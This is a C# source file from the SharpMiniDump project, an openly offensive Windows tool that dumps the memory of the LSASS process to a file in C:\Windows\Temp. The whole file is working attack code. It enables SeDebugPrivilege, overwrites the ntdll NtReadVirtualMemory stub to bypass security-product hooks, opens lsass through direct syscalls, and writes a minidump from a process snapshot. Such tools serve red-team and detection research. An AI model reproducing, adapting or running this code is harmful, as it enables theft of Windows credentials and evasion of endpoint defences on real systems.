//
// Author: B4rtik (@b4rtik)
// Project: SharpMiniDump (https://github.com/b4rtik/SharpMiniDump)
// License: BSD 3-Clause
//

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace SharpMiniDump
{
    
    public class Program
    {
        static void Main(string[] args)
        {
            Execute(args);
        }

        public static void Execute(string[] args)
        {
            if (IntPtr.Size != 8)
            {
                return;
            }

            if (!IsElevated())
            {
                Console.WriteLine("Run in High integrity context");
                return;
            }

            SetDebugPrivilege();

            Natives.WIN_VER_INFO pWinVerInfo = new Natives.WIN_VER_INFO();

            Natives.OSVERSIONINFOEXW osInfo = new Natives.OSVERSIONINFOEXW();
            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);

            Natives.RtlGetVersion(ref osInfo);

            pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion + "." + osInfo.dwMinorVersion;

            Console.WriteLine("[*] OS MajorMinor version : " + pWinVerInfo.chOSMajorMinor);
            if(!pWinVerInfo.chOSMajorMinor.Equals("10.0"))
            {
                Console.WriteLine("[x] Windows 10 - Windows Server 2016 only");
                return;
            }

            pWinVerInfo.SystemCall = 0x3F;

            Natives.RtlInitUnicodeString(ref pWinVerInfo.ProcName, @"lsass.exe");
            pWinVerInfo.hTargetPID = (IntPtr)Process.GetProcessesByName("lsass")[0].Id;

            pWinVerInfo.lpApiCall = "NtReadVirtualMemory";

            if (!UnHookNativeApi(pWinVerInfo))
            {
                Console.WriteLine("[x] error unhooking {0}", pWinVerInfo.lpApiCall);
                return;
            }

            Natives.CLIENT_ID clientid = new Natives.CLIENT_ID();
            clientid.UniqueProcess = pWinVerInfo.hTargetPID;
            clientid.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;

            Natives.OBJECT_ATTRIBUTES objAttribute = new Natives.OBJECT_ATTRIBUTES();


            var status = NativeSysCall.ZwOpenProcess10(ref hProcess, Natives.ProcessAccessFlags.All, objAttribute, ref clientid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error ZwOpenProcess10  " + status);
                return;
            }

            Console.WriteLine("[*] ZwOpenProcess10  " + status);

            Natives.PSS_CAPTURE_FLAGS flags = Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
        | Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
        | Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION;

            IntPtr SnapshotHandle = IntPtr.Zero;
            int pss = Natives.PssCaptureSnapshot(hProcess,flags, 1048607,ref SnapshotHandle);
            Console.WriteLine("[*] PssCaptureSnapshot " + pss);
            if (SnapshotHandle == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error PssCaptureSnapshot  ");
                return;
            }

            Natives.UNICODE_STRING uFileName = new Natives.UNICODE_STRING();
            Natives.RtlInitUnicodeString(ref uFileName, @"\??\C:\Windows\Temp\dumpert.dmp");

            Microsoft.Win32.SafeHandles.SafeFileHandle hDmpFile;
            IntPtr hElm = IntPtr.Zero;
            Natives.IO_STATUS_BLOCK IoStatusBlock = new Natives.IO_STATUS_BLOCK();

            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(uFileName));
            Marshal.StructureToPtr(uFileName, objectName, true);

            Natives.OBJECT_ATTRIBUTES FileObjectAttributes = new Natives.OBJECT_ATTRIBUTES
            {
                ObjectName = objectName,
                Attributes = 0x00000040,
                Length = (ulong)Marshal.SizeOf(typeof(Natives.OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            Natives.LARGE_INTEGER lint = new Natives.LARGE_INTEGER();
            lint.HighPart = 0;
            lint.LowPart = 0;

            long allocationsize = 0;

            status = NativeSysCall.NtCreateFile10(
                out hDmpFile,
                (int)Natives.FILE_GENERIC_WRITE,
                ref FileObjectAttributes,
                out IoStatusBlock,
                ref allocationsize,
                Natives.FILE_ATTRIBUTE_NORMAL,
                System.IO.FileShare.Write,
                Natives.FILE_OVERWRITE_IF,
                Natives.FILE_SYNCHRONOUS_IO_NONALERT,
                hElm, 0);

            if (hDmpFile.IsInvalid)
            {
                Console.WriteLine("[x] Error NtCreateFile10  " + status + " " + IoStatusBlock.status);
                NativeSysCall.ZwClose10(hProcess);
                return;
            }

            
            Natives.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Natives.MINIDUMP_CALLBACK_INFORMATION();
            CallbackInfo.CallbackRoutine = Program.MyMiniDumpWriteDumpCallback;
            CallbackInfo.CallbackParam = IntPtr.Zero;

            IntPtr pCallbackInfo = Marshal.AllocHGlobal(Marshal.SizeOf(CallbackInfo));
            Marshal.StructureToPtr(CallbackInfo, pCallbackInfo, false);

            IntPtr ExceptionParam = IntPtr.Zero;
            IntPtr UserStreamParam = IntPtr.Zero;
            IntPtr CallbackParam = IntPtr.Zero;

            Console.WriteLine("[*] Target PID " + pWinVerInfo.hTargetPID);
            Console.WriteLine("[*] Generating minidump.... " + pWinVerInfo.hTargetPID);
            
            if (!Natives.MiniDumpWriteDump(SnapshotHandle, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, pCallbackInfo))
            {
                Console.WriteLine("[x] Error MiniDumpWriteDump  ");
                NativeSysCall.ZwClose10(hProcess);
                return;
            }

            hDmpFile.Dispose();
            NativeSysCall.ZwClose10(hProcess);

            Console.WriteLine("[*] End ");
            Console.WriteLine("[*] Minidump generated in  " + Marshal.PtrToStringUni(uFileName.Buffer).Substring(4));
        }

        private static bool UnHookNativeApi(Natives.WIN_VER_INFO pWinVerInfo)
        {
            byte[] AssemblyBytes = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };
            AssemblyBytes[4] = (byte)pWinVerInfo.SystemCall;

            IntPtr ntdll = Natives.LoadLibrary("ntdll.dll");
            IntPtr proc = Natives.GetProcAddress(ntdll, pWinVerInfo.lpApiCall);

            IntPtr lpBaseAddress = proc;
            uint OldProtection = 0;
            uint NewProtection = 0;
            uint uSize = 10;
            var status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, 0x40, ref OldProtection);
            if (status != Natives.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwProtectVirtualMemory10 1 " + status);
                return false;
            }

            IntPtr written = IntPtr.Zero;
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(AssemblyBytes.Length);
            Marshal.Copy(AssemblyBytes, 0, unmanagedPointer, AssemblyBytes.Length);

            status = NativeSysCall.ZwWriteVirtualMemory10(Process.GetCurrentProcess().Handle, ref proc, unmanagedPointer, (uint)AssemblyBytes.Length, ref written);
            if (status != Natives.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwWriteVirtualMemory10 " + status);
                return false;
            }

            status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, OldProtection, ref NewProtection);
            if (status != Natives.NTSTATUS.Success)
            {
                Console.WriteLine("[x] Error ZwProtectVirtualMemory10 2" + status);
                return false;
            }

            Marshal.FreeHGlobal(unmanagedPointer);

            return true;
        }

        private static bool IsElevated()
        {
            return TokenIsElevated(GetCurrentProcessToken());
        }

        private static IntPtr GetCurrentProcessToken()
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            IntPtr currentProcessToken = new IntPtr();
            if (!Natives.OpenProcessToken(Process.GetCurrentProcess().Handle, Natives.TOKEN_ALL_ACCESS, out currentProcessToken))
            {
                Console.WriteLine("Error OpenProcessToken " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            return currentProcessToken;
        }

        private static bool TokenIsElevated(IntPtr hToken)
        {
            Natives.TOKEN_ELEVATION tk = new Natives.TOKEN_ELEVATION();
            tk.TokenIsElevated = 0;
            
            IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk));
            Marshal.StructureToPtr(tk, lpValue, false);

            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(Natives.TOKEN_ELEVATION));
            UInt32 returnLength;

            Boolean result = Natives.GetTokenInformation(
                hToken,
                Natives.TOKEN_INFORMATION_CLASS.TokenElevation,
                lpValue,
                tokenInformationLength,
                out returnLength
            );

            Natives.TOKEN_ELEVATION elv = (Natives.TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(Natives.TOKEN_ELEVATION));
            
            if (elv.TokenIsElevated == 1)
            {             
                return true;
            }
            else
            {

                return false;
            }
        }

        public static bool SetDebugPrivilege()
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            string Privilege = "SeDebugPrivilege";
            IntPtr hToken = GetCurrentProcessToken();
            Natives.LUID luid = new Natives.LUID();
            if (!Natives.LookupPrivilegeValue(null, Privilege, ref luid))
            {
                Console.WriteLine("Error LookupPrivilegeValue" + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            Natives.LUID_AND_ATTRIBUTES luidAndAttributes = new Natives.LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Natives.SE_PRIVILEGE_ENABLED;

            Natives.TOKEN_PRIVILEGES newState = new Natives.TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Natives.TOKEN_PRIVILEGES previousState = new Natives.TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            if (!Natives.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                Console.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            return true;
        }

        private static bool MyMiniDumpWriteDumpCallback(IntPtr CallbackParam, ref Natives.MINIDUMP_CALLBACK_INPUT CallbackInput, ref Natives.MINIDUMP_CALLBACK_OUTPUT CallbackOutput)
        {
            switch (CallbackInput.CallbackType)
	        {
	        case Natives.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback: // IsProcessSnapshotCallback
                CallbackOutput.Status = 1;
		        break;
	        }
	        return true;
        }
    }
}
